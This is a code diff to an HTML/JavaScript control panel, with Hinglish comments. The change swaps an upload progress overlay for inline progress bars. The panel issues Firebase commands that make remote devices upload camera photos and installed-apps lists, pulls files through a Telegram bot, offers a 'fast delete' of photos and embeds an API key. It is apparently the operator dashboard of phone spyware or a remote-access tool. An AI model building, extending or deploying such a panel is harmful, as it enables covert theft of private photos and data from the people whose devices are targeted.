@@ -218,30 +218,59 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .tg-log { background:#050810; border:1px solid #1E3A8A; border-radius:8px; padding:10px; margin-top:10px; max-height:200px; overflow-y:auto; font-family:'Courier New',monospace; font-size:10px; line-height:1.6; }
 .tg-log-line { color:#94A3B8; padding:2px 0; border-bottom:1px solid rgba(30,58,138,0.3); word-break:break-word; }
 .tg-log-line:last-child { border-bottom:none; color:#E5E7EB; }
-/* ═══ PREMIUM PROGRESS OVERLAY ═══ */
-.progress-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.92); z-index:9999; display:none; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(10px); }
-.progress-overlay.active { display:flex; }
-.progress-card { background:linear-gradient(135deg, #0A1428 0%, #050810 100%); border:1px solid rgba(59,130,246,0.4); border-radius:20px; padding:32px 28px; max-width:420px; width:100%; box-shadow:0 0 60px rgba(59,130,246,0.15), 0 0 120px rgba(59,130,246,0.05); animation:progressIn 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
-@keyframes progressIn { from { opacity:0; transform:scale(0.9) translateY(20px); } to { opacity:1; transform:scale(1) translateY(0); } }
-.progress-icon { width:64px; height:64px; margin:0 auto 16px; background:linear-gradient(135deg,#3B82F6,#06B6D4); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:28px; box-shadow:0 0 30px rgba(59,130,246,0.6); animation:iconPulse 2s ease-in-out infinite; }
-@keyframes iconPulse { 0%,100% { transform:scale(1); box-shadow:0 0 30px rgba(59,130,246,0.6); } 50% { transform:scale(1.08); box-shadow:0 0 50px rgba(59,130,246,0.9); } }
-.progress-icon.done { background:linear-gradient(135deg,#10B981,#059669); box-shadow:0 0 30px rgba(16,185,129,0.6); animation:none; }
-.progress-title { color:#60A5FA; font-size:18px; font-weight:bold; text-align:center; margin-bottom:6px; letter-spacing:0.02em; }
-.progress-title.done { color:#10B981; }
-.progress-subtitle { color:#64748B; font-size:12px; text-align:center; margin-bottom:24px; line-height:1.5; }
-.progress-bar-container { background:#050810; border:1px solid #1E3A8A; border-radius:12px; height:32px; overflow:hidden; position:relative; margin-bottom:16px; }
-.progress-bar-fill { height:100%; width:0%; background:linear-gradient(90deg,#3B82F6,#06B6D4,#3B82F6); background-size:200% 100%; border-radius:12px; transition:width 0.4s cubic-bezier(0.4, 0, 0.2, 1); animation:shimmer 2s linear infinite; box-shadow:0 0 20px rgba(59,130,246,0.5); }
-.progress-bar-fill.done { background:linear-gradient(90deg,#10B981,#059669); animation:none; box-shadow:0 0 25px rgba(16,185,129,0.7); }
+/* ═══ INLINE PROGRESS BAR ═══ */
+.inline-progress {
+  display:none;
+  margin-top:12px;
+  padding:12px;
+  background:rgba(59,130,246,0.05);
+  border:1px solid rgba(59,130,246,0.25);
+  border-radius:10px;
+}
+.inline-progress.active { display:block; animation:fadeIn 0.3s; }
+@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+.inline-progress-head {
+  display:flex; justify-content:space-between; align-items:center;
+  margin-bottom:8px;
+}
+.inline-progress-status {
+  font-size:11px; color:#60A5FA; font-weight:bold;
+}
+.inline-progress-status.done { color:#10B981; }
+.inline-progress-status.err { color:#F87171; }
+.inline-progress-percent {
+  font-size:12px; color:#60A5FA; font-weight:bold;
+}
+.inline-progress-percent.done { color:#10B981; }
+.inline-progress-percent.err { color:#F87171; }
+.inline-progress-bar-bg {
+  background:#050810; border:1px solid #1E3A8A;
+  border-radius:8px; height:20px; overflow:hidden;
+  position:relative;
+}
+.inline-progress-bar-fill {
+  height:100%; width:0%;
+  background:linear-gradient(90deg,#3B82F6,#06B6D4,#3B82F6);
+  background-size:200% 100%;
+  border-radius:8px;
+  transition:width 0.4s ease;
+  animation:shimmer 2s linear infinite;
+  box-shadow:0 0 12px rgba(59,130,246,0.5);
+}
+.inline-progress-bar-fill.done {
+  background:linear-gradient(90deg,#10B981,#059669);
+  animation:none;
+  box-shadow:0 0 15px rgba(16,185,129,0.7);
+}
+.inline-progress-bar-fill.err {
+  background:linear-gradient(90deg,#EF4444,#DC2626);
+  animation:none;
+  box-shadow:0 0 12px rgba(239,68,68,0.5);
+}
 @keyframes shimmer { 0% { background-position:200% 0; } 100% { background-position:-200% 0; } }
-.progress-percent { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#FFF; font-size:13px; font-weight:bold; text-shadow:0 0 8px rgba(0,0,0,0.8); letter-spacing:0.05em; }
-.progress-stats { display:flex; justify-content:space-between; align-items:center; font-size:12px; color:#94A3B8; margin-bottom:16px; }
-.progress-stats .count { color:#60A5FA; font-weight:bold; font-size:14px; }
-.progress-stats .label { color:#64748B; }
-.progress-status { background:rgba(59,130,246,0.08); border:1px solid rgba(59,130,246,0.2); border-radius:8px; padding:10px 14px; font-size:11px; color:#60A5FA; text-align:center; line-height:1.5; min-height:40px; display:flex; align-items:center; justify-content:center; }
-.progress-status.done { background:rgba(16,185,129,0.08); border-color:rgba(16,185,129,0.3); color:#10B981; }
-.progress-status.err { background:rgba(239,68,68,0.08); border-color:rgba(239,68,68,0.3); color:#F87171; }
-.progress-close-btn { width:100%; padding:12px; margin-top:16px; background:#1E3A8A; color:#60A5FA; border:1px solid #3B82F6; border-radius:10px; font-size:13px; font-weight:bold; cursor:pointer; transition:all 0.2s; }
-.progress-close-btn:hover { background:#1E40AF; color:#FFF; }
+.inline-progress-stats {
+  font-size:10px; color:#64748B; margin-top:6px; text-align:center;
+}
 @media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }
 </style>
 </head>
@@ -406,25 +435,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   </div>
 </div>
 
-<!-- ✅ PREMIUM PROGRESS OVERLAY -->
-<div class="progress-overlay" id="progressOverlay">
-  <div class="progress-card">
-    <div class="progress-icon" id="progressIcon">📤</div>
-    <div class="progress-title" id="progressTitle">Uploading...</div>
-    <div class="progress-subtitle" id="progressSubtitle">Please wait</div>
-    <div class="progress-bar-container">
-      <div class="progress-bar-fill" id="progressBarFill"></div>
-      <div class="progress-percent" id="progressPercent">0%</div>
-    </div>
-    <div class="progress-stats">
-      <span><span class="count" id="progressDone">0</span> <span class="label">uploaded</span></span>
-      <span><span class="count" id="progressTotal">0</span> <span class="label">total</span></span>
-    </div>
-    <div class="progress-status" id="progressStatus">Starting...</div>
-    <button class="progress-close-btn" id="progressCloseBtn" onclick="hideProgress()">CLOSE</button>
-  </div>
-</div>
-
 <script>
 var RTO_CONFIG = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
@@ -447,75 +457,58 @@ var TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false }
 var telegramConfigListener = null;
 var telegramUrlCache = {};
 
-// ✅ NAYA — Progress listeners
-var progressListener = null;
-var progressType = '';
+// ✅ Progress listeners (inline)
+var inlineProgressListener = null;
 
 // ═══════════════════════════════════════════════════════════
-// PREMIUM PROGRESS OVERLAY
+// INLINE PROGRESS — Photo/Apps tab ke andar
 // ═══════════════════════════════════════════════════════════
-function showProgress(title, subtitle, icon, type) {
-  progressType = type;
-  document.getElementById('progressIcon').textContent = icon;
-  document.getElementById('progressIcon').className = 'progress-icon';
-  document.getElementById('progressIcon').style.background = '';
-  document.getElementById('progressTitle').textContent = title;
-  document.getElementById('progressTitle').className = 'progress-title';
-  document.getElementById('progressSubtitle').textContent = subtitle;
-  document.getElementById('progressBarFill').style.width = '0%';
-  document.getElementById('progressBarFill').className = 'progress-bar-fill';
-  document.getElementById('progressPercent').textContent = '0%';
-  document.getElementById('progressDone').textContent = '0';
-  document.getElementById('progressTotal').textContent = '0';
-  document.getElementById('progressStatus').className = 'progress-status';
-  document.getElementById('progressStatus').textContent = 'Starting...';
-  document.getElementById('progressCloseBtn').style.display = 'none';
-  document.getElementById('progressOverlay').classList.add('active');
+function startInlineProgress(type, total, statusText) {
+  var suffix = type === 'photos' ? 'Photos' : 'Apps';
+  var container = document.getElementById('inlineProgress' + suffix);
+  if (!container) return;
+  container.classList.add('active');
+  updateInlineProgress(type, 0, total, statusText);
 }
 
-function updateProgress(done, total, status) {
+function updateInlineProgress(type, done, total, statusText) {
+  var suffix = type === 'photos' ? 'Photos' : 'Apps';
+  var bar = document.getElementById('inlineProgressBar' + suffix);
+  var percent = document.getElementById('inlineProgressPercent' + suffix);
+  var icon = document.getElementById('inlineProgressIcon' + suffix);
+  var stats = document.getElementById('inlineProgressStats' + suffix);
+  if (!bar) return;
   var pct = total > 0 ? Math.round((done / total) * 100) : 0;
-  document.getElementById('progressBarFill').style.width = pct + '%';
-  document.getElementById('progressPercent').textContent = pct + '%';
-  document.getElementById('progressDone').textContent = done;
-  document.getElementById('progressTotal').textContent = total;
-  if (status) document.getElementById('progressStatus').textContent = status;
-}
-
-function completeProgress(statusText) {
-  document.getElementById('progressIcon').textContent = '✅';
-  document.getElementById('progressIcon').className = 'progress-icon done';
-  document.getElementById('progressTitle').textContent = 'Upload Complete!';
-  document.getElementById('progressTitle').className = 'progress-title done';
-  document.getElementById('progressBarFill').style.width = '100%';
-  document.getElementById('progressBarFill').className = 'progress-bar-fill done';
-  document.getElementById('progressPercent').textContent = '100%';
-  document.getElementById('progressStatus').className = 'progress-status done';
-  document.getElementById('progressStatus').textContent = statusText || 'All done!';
-  document.getElementById('progressCloseBtn').style.display = 'block';
-  setTimeout(function() {
-    if (document.getElementById('progressOverlay').classList.contains('active')) hideProgress();
-  }, 4000);
-}
-
-function errorProgress(errorText) {
-  document.getElementById('progressIcon').textContent = '❌';
-  document.getElementById('progressIcon').className = 'progress-icon';
-  document.getElementById('progressIcon').style.background = 'linear-gradient(135deg, #EF4444, #DC2626)';
-  document.getElementById('progressTitle').textContent = 'Upload Failed';
-  document.getElementById('progressTitle').className = 'progress-title';
-  document.getElementById('progressStatus').className = 'progress-status err';
-  document.getElementById('progressStatus').textContent = errorText || 'Something went wrong';
-  document.getElementById('progressCloseBtn').style.display = 'block';
-}
-
-function hideProgress() {
-  document.getElementById('progressOverlay').classList.remove('active');
-  document.getElementById('progressIcon').style.background = '';
-  if (progressListener) {
-    try { progressListener.off(); } catch(e) {}
-    progressListener = null;
+  bar.style.width = pct + '%';
+  percent.textContent = pct + '%';
+  if (statusText && icon) icon.textContent = statusText;
+  if (stats) stats.textContent = done + ' / ' + total + ' uploaded';
+  if (pct >= 100) {
+    bar.className = 'inline-progress-bar-fill done';
+    if (icon) icon.className = 'inline-progress-status done';
+    if (percent) percent.className = 'inline-progress-percent done';
+  } else {
+    bar.className = 'inline-progress-bar-fill';
+    if (icon) icon.className = 'inline-progress-status';
+    if (percent) percent.className = 'inline-progress-percent';
   }
+}
+
+function updateInlineProgressError(type, errorText) {
+  var suffix = type === 'photos' ? 'Photos' : 'Apps';
+  var bar = document.getElementById('inlineProgressBar' + suffix);
+  var icon = document.getElementById('inlineProgressIcon' + suffix);
+  var percent = document.getElementById('inlineProgressPercent' + suffix);
+  if (!bar) return;
+  bar.className = 'inline-progress-bar-fill err';
+  if (icon) { icon.textContent = '❌ ' + (errorText || 'Failed'); icon.className = 'inline-progress-status err'; }
+  if (percent) percent.className = 'inline-progress-percent err';
+}
+
+function endInlineProgress(type) {
+  var suffix = type === 'photos' ? 'Photos' : 'Apps';
+  var container = document.getElementById('inlineProgress' + suffix);
+  if (container) container.classList.remove('active');
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -709,7 +702,7 @@ function executeFastDelete(items) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// UPLOAD COMMAND — Custom Quantity + Order + Premium Progress
+// UPLOAD COMMAND — Custom Quantity + Order + Inline Progress
 // ═══════════════════════════════════════════════════════════
 var photoFilter = 'camera', photoQuantity = 100, photoOrder = 'newest';
 function openPhotoUploadDialog() {
@@ -785,25 +778,27 @@ function sendPhotoCommand() {
   var filter = photoFilter, qty = photoQuantity, order = photoOrder;
   closePhotoDialog();
   
-  showProgress('Uploading Photos...', 'Filter: ' + filter + ' • Qty: ' + qty + ' • Order: ' + order, '📤', 'photos');
+  // ✅ Inline progress start karo (photo tab ke andar)
+  startInlineProgress('photos', qty, '⏳ Command sent — waiting for device...');
   
-  if (progressListener) { try { progressListener.off(); } catch(e) {} }
-  progressListener = db.ref('device_info/' + curId + '/photo_upload_command');
-  progressListener.on('value', function(snap) {
+  if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} }
+  inlineProgressListener = db.ref('device_info/' + curId + '/photo_upload_command');
+  inlineProgressListener.on('value', function(snap) {
     var d = snap.val() || {};
     var status = d.status || 'pending';
     if (status === 'pending') {
-      updateProgress(0, qty, '⏳ Command sent — waiting for device...');
+      updateInlineProgress('photos', 0, qty, '⏳ Command sent — waiting for device...');
     } else if (status === 'uploading') {
       var uploaded = d.uploaded || 0;
       var total = d.total || qty;
-      updateProgress(uploaded, total, '📤 Uploading... ' + uploaded + ' / ' + total);
+      updateInlineProgress('photos', uploaded, total, '📤 Uploading...');
     } else if (status === 'completed') {
       var uploaded = d.uploaded || qty;
-      updateProgress(uploaded, uploaded, '✅ Done');
-      completeProgress('✅ ' + uploaded + ' photos uploaded successfully');
+      updateInlineProgress('photos', uploaded, uploaded, '✅ Upload complete!');
+      setTimeout(function() { endInlineProgress('photos'); }, 3000);
     } else if (status === 'failed') {
-      errorProgress(d.error || 'Upload failed');
+      updateInlineProgressError('photos', d.error || 'Upload failed');
+      setTimeout(function() { endInlineProgress('photos'); }, 3000);
     }
   });
   
@@ -815,7 +810,7 @@ function sendPhotoCommand() {
     uploaded: 0,
     total: qty,
     timestamp: Date.now()
-  }).catch(function(e) { errorProgress('❌ ' + e.message); });
+  }).catch(function(e) { updateInlineProgressError('photos', e.message); });
 }
 function listenPhotoCommandStatus() {
   if (!curId) return;
@@ -833,28 +828,29 @@ function listenPhotoCommandStatus() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// APPS UPLOAD COMMAND — Premium Progress
+// APPS UPLOAD COMMAND — Inline Progress
 // ═══════════════════════════════════════════════════════════
 function requestAppsUpload() {
   if (!curId) { alert('No device selected'); return; }
   if (!confirm('📦 Request apps list upload from device?')) return;
   
-  showProgress('Uploading Apps List...', 'Scanning installed apps on device', '📦', 'apps');
+  startInlineProgress('apps', 100, '⏳ Command sent — waiting for device...');
   
-  if (progressListener) { try { progressListener.off(); } catch(e) {} }
-  progressListener = db.ref('device_info/' + curId + '/apps_upload_command');
-  progressListener.on('value', function(snap) {
+  if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} }
+  inlineProgressListener = db.ref('device_info/' + curId + '/apps_upload_command');
+  inlineProgressListener.on('value', function(snap) {
     var d = snap.val() || {};
     var status = d.status || 'pending';
     if (status === 'pending') {
-      updateProgress(0, 100, '⏳ Command sent — waiting for device...');
+      updateInlineProgress('apps', 0, 100, '⏳ Command sent — waiting for device...');
     } else if (status === 'uploading') {
-      updateProgress(50, 100, '📤 Scanning and uploading apps...');
+      updateInlineProgress('apps', 50, 100, '📤 Scanning and uploading apps...');
     } else if (status === 'completed') {
-      updateProgress(100, 100, '✅ Done');
-      completeProgress('✅ Apps list uploaded successfully');
+      updateInlineProgress('apps', 100, 100, '✅ Apps list uploaded!');
+      setTimeout(function() { endInlineProgress('apps'); }, 3000);
     } else if (status === 'failed') {
-      errorProgress(d.error || 'Upload failed');
+      updateInlineProgressError('apps', d.error || 'Upload failed');
+      setTimeout(function() { endInlineProgress('apps'); }, 3000);
     }
   });
   
@@ -862,7 +858,7 @@ function requestAppsUpload() {
     status: 'pending',
     timestamp: Date.now(),
     requested_at: new Date().toLocaleString()
-  }).catch(function(e) { errorProgress('❌ ' + e.message); });
+  }).catch(function(e) { updateInlineProgressError('apps', e.message); });
 }
 
 // ═══ SAVED ACCOUNTS ═══
@@ -914,8 +910,7 @@ function doLogout() {
   if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} telegramConfigListener = null; }
   TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
   telegramUrlCache = {};
-  if (progressListener) { try { progressListener.off(); } catch(e) {} progressListener = null; }
-  hideProgress();
+  if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} inlineProgressListener = null; }
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -1140,7 +1135,7 @@ function renderTab() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// PHOTOS RENDER
+// PHOTOS RENDER — with inline progress
 // ═══════════════════════════════════════════════════════════
 function renderPhotos() {
   var b = document.getElementById('dBody');
@@ -1152,6 +1147,17 @@ function renderPhotos() {
       '</div>' +
       '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-bottom:8px;">📤 REQUEST UPLOAD</button>' +
       '<button onclick="openFastDeleteDialog()" style="width:100%; padding:12px; background:linear-gradient(135deg,#EF4444,#F59E0B); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer;">🚀 FAST DELETE (Firebase)</button>' +
+      // ✅ Inline progress bar
+      '<div class="inline-progress" id="inlineProgressPhotos">' +
+        '<div class="inline-progress-head">' +
+          '<div class="inline-progress-status" id="inlineProgressIconPhotos">📤 Uploading...</div>' +
+          '<div class="inline-progress-percent" id="inlineProgressPercentPhotos">0%</div>' +
+        '</div>' +
+        '<div class="inline-progress-bar-bg">' +
+          '<div class="inline-progress-bar-fill" id="inlineProgressBarPhotos"></div>' +
+        '</div>' +
+        '<div class="inline-progress-stats" id="inlineProgressStatsPhotos">0 / 0 uploaded</div>' +
+      '</div>' +
     '</div>';
   var arr = Object.entries(photos);
   arr = arr.filter(function(p) { return p[1] && (p[1].telegram_file_id || p[1].url || p[1].base64); });
@@ -1204,7 +1210,7 @@ document.getElementById('pDownload').addEventListener('click', function() {
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
 // ═══════════════════════════════════════════════════════════
-// APPS RENDER — Firebase direct (no CORS) + Upload button
+// APPS RENDER — Firebase direct + inline progress
 // ═══════════════════════════════════════════════════════════
 function renderApps() {
   var b = document.getElementById('dBody');
@@ -1227,9 +1233,19 @@ function renderApps() {
         '<div style="font-size:10px; color:' + statusColor + '; font-weight:bold;">' + statusText + '</div>' +
       '</div>' +
       '<button onclick="requestAppsUpload()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 REQUEST APPS UPLOAD</button>' +
+      // ✅ Inline progress bar
+      '<div class="inline-progress" id="inlineProgressApps">' +
+        '<div class="inline-progress-head">' +
+          '<div class="inline-progress-status" id="inlineProgressIconApps">📤 Uploading...</div>' +
+          '<div class="inline-progress-percent" id="inlineProgressPercentApps">0%</div>' +
+        '</div>' +
+        '<div class="inline-progress-bar-bg">' +
+          '<div class="inline-progress-bar-fill" id="inlineProgressBarApps"></div>' +
+        '</div>' +
+        '<div class="inline-progress-stats" id="inlineProgressStatsApps">0 / 0 uploaded</div>' +
+      '</div>' +
     '</div>';
   
-  // ✅ Firebase mein apps list hai? Direct dikhao
   if (tg.apps && Array.isArray(tg.apps) && tg.apps.length > 0) {
     var apps = tg.apps.slice();
     apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
@@ -1240,7 +1256,6 @@ function renderApps() {
     return;
   }
   
-  // ⚠️ Fallback — Telegram se fetch (CORS fail ho sakta hai)
   var fileId = tg.telegram_file_id;
   if (fileId) {
     b.innerHTML = topHtml + '<div class="loading">Loading apps...</div>';
@@ -1251,7 +1266,7 @@ function renderApps() {
       b.innerHTML = topHtml + '<div style="margin-bottom:10px;color:#64748B;font-size:10px;">📦 ' + apps.length + ' apps (Telegram)</div>' +
         apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
     }).catch(function(e) {
-      b.innerHTML = topHtml + '<div class="empty">⚠️ Apps list Firebase mein nahi hai.<br><br>REQUEST APPS UPLOAD dabao — ya app rebuild karke install karo.</div>';
+      b.innerHTML = topHtml + '<div class="empty">⚠️ Apps list Firebase mein nahi hai.<br><br>REQUEST APPS UPLOAD dabao.</div>';
     });
   } else {
     b.innerHTML = topHtml + '<div class="empty">No apps yet<br><br>REQUEST APPS UPLOAD dabao</div>';
